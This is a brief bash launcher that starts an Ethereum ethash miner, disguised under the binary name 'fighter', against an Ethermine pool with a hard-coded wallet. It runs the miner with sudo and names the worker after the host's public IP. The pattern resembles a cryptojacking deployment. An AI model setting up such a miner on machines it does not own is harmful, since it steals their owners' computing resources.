#!/bin/bash

POOL=ethproxy+tcp://asia1.ethermine.org:4444
WALLET=0xe059139a081151e631591d6d30fdd150120fcd05
WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )-fgt

cd "$(dirname "$0")"

chmod +x ./fighter && sudo ./fighter -a ethash -o $POOL -u $WALLET.$WORKER $@
